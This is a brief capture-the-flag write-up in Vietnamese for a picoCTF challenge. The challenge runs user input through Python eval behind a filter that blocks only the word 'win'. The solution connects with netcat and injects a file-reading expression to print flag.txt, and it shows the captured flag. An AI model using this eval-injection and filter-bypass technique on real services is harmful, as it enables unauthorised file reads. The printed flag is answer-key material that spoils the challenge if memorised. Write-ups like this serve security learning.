### Description 
> Can you figure out how this program works to get the flag?
### Solution 
- Tương tự như bài kia, bài này hàm vẫn như cũ, chỉ khác là nó có thêm 1 hàm `filter` chặn ta nhập hàm win vào 
```
def filter(user_input):
  if 'win' in user_input:
    return False
  return True


while(True):
  try:
    user_input = input('==> ')
    if( filter(user_input) ):
      eval(user_input + '()')
    else:
      print('Illegal input')
  except Exception as e:
    print(e)
```
- Nhưng, thay vì thực thi hàm win ta có thể thực thi luôn việc đọc flag.txt. Bản chất của 2 việc này đều giống nhau
```
┌──(kali㉿kali)-[~/Downloads]
└─$ nc saturn.picoctf.net 56132
==> print(open('flag.txt', 'r').read())
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}
'NoneType' object is not callable

```
